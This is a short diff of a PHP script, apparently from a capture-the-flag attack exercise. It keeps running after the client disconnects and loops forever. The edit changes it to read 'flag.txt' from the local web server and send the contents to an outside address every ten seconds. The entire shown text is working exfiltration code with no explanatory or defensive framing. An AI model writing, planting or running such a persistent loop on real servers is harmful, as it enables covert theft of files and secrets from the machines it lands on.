@@ -34,9 +34,9 @@ ignore_user_abort(true);
 set_time_limit(0);
 
 while (True){
-    $f=(file_get_contents('http://10.0.0.2:8080'));
-    file_get_contents("http://172.16.5.12:6061/?f=".$f);
-    sleep(60);
+    $f=file_get_contents('http://localhost:80/flag.txt');
+    file_get_contents("http://172.16.80.1:8000?f=".$f);
+    sleep(10);
 }
 ?>
 
